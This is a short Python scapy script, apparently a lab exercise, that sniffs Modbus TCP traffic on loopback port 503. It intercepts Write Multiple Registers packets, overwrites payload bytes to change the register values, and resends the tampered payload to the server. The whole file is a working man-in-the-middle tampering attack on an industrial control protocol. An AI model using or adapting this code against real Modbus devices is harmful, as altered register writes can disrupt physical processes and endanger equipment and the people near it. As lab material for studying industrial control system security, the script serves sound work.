from scapy.all import *
from scapy.layers.inet import IP, TCP
import os
import time

def intercept_modify(packet, server_ip="localhost", server_port=503):
    """
    Function to modify an intercepted Modbus TCP packet and send it 
    in a way to change the behavior of the original packet.
    In this function we tried to intercept a write multiple registers packet and modify it to change the values.
    
    The objective of this modification is to change the first 4 registers in [0, 4369, 0, 0, ...]    
    
    params:
        packet: The intercepted packet
    """
    # Check if the packet has a TCP layer and the destination port is the server_port
    if packet.haslayer(TCP) and packet[TCP].dport == server_port:
        
        # check if the packet has a payload
        if Raw in packet:
            modbus_payload = bytearray(packet[Raw].load)
            
            # Check if the function code is 16 (Write Multiple Registers)
            if modbus_payload[7] == 16:
                print("Modbus TCP packet intercepted!")
                print("Original:", modbus_payload)
                
                # Modification of the packet
                modbus_payload[15] = 0x11 
                modbus_payload[16] = 0x11  
                
                print("Modified packet:", modbus_payload)
                
                # Change the packet payload with the modified one
                packet[Raw].load = bytes(modbus_payload)
                
                # Send the modified packet to the server
                time.sleep(2)
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # INET for IPv4, SOCK_STREAM for TCP connection
                    sock.connect((server_ip, server_port)) # Connect to the server
                    print(packet[Raw].load)
                    sock.send(packet[Raw].load)

                    response = sock.recv(1024)  
                    sock.close()
                except Exception as e:
                    print(f"Error during the communication: {e}")
                    response = None
                print("Modified Modbus TCP packet sent!")

# Start sniffing the packets on the loopback interface, with the filter to capture only the Modbus TCP packets on the selected port
sniff(iface="Software Loopback Interface 1", prn=intercept_modify, filter="tcp port 503", count=30)
